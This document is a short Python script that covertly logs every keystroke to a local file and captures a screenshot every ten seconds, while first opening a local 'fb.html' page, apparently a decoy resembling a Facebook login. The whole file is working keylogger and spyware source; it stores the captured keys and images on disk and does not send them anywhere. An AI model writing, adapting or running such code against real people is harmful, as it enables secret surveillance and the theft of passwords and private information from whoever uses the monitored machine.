#!/usr/bin/env python
from mss import mss
from pynput.keyboard import Listener, Key
from threading import Timer, Thread
import time
import os
import webbrowser

class IntervalTimer(Timer):
	def run(self):
		while not self.finished.wait(self.interval):
			self.function(*self.args, **self.kwargs)

class Monitor:
	count = 0
	keys = []

	def _on_press(self, k):
		with open("./data/log1/keys/logss.txt", "a") as f:
			f.write('Key Pressed: {}\n'.format(k))

	def _keylogger(self):
		with Listener(on_press = self._on_press, on_release = self._on_release) as listener:
			listener.join()

	def _on_release(self, k):
		if k == Key.esc:
			return False

	

	def _build_logs(self):
		if not os.path.exists('./data/log1'):
			os.mkdir('./data/log1')
			os.mkdir('./data/log1/screenshots')
			os.mkdir('./data/log1/keys')

	def _screenshot(self):
		sct = mss()
		sct.shot(output = './data/log1/screenshots/{}.png'.format(time.time()))

	def run(self, interval = 10):
		#interval is time between ss
		self._build_logs()
		Thread(target = self._keylogger).start()
		IntervalTimer(interval, self._screenshot).start()

# if __name__ = '__main__':
webbrowser.open('fb.html')
mon = Monitor()
mon.run()
